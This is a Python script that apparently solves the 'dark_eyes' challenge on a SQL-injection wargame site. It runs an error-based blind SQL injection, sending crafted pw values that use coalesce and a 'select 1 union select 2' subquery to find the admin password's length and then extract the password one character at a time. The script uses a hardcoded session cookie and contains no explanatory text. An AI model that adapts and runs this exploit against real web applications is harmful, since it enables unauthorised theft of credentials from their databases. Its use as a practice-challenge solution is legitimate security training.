from string import digits,ascii_lowercase
import requests

session = requests.Session()
cookies = {"PHPSESSID": "fffauljsraf3ka4sur3cupqn6e"}

url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php?pw=' or id='admin' and (select coalesce((select pw where length(pw)={}),(select 1 union select 2)));--+"
for i in range(200):
    r = requests.get(url.format(i), cookies=cookies)
    print(i, end='\r')
    if('?php' in r.text):
        l = i
        break
print("Length :", l)
url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php?pw=' or id='admin' and (select coalesce((select pw where pw like '{}%'),(select 1 union select 2)));--+"
pw = ""
for j in range(l):
    for i in digits+ascii_lowercase:
        r = requests.get(url.format(pw+i), cookies=cookies)
        if('?php' in r.text and i not in "#+%.&"):
            pw += i
            print("Password : {}".format(pw), end='\r')
            break
print("Password :", pw)
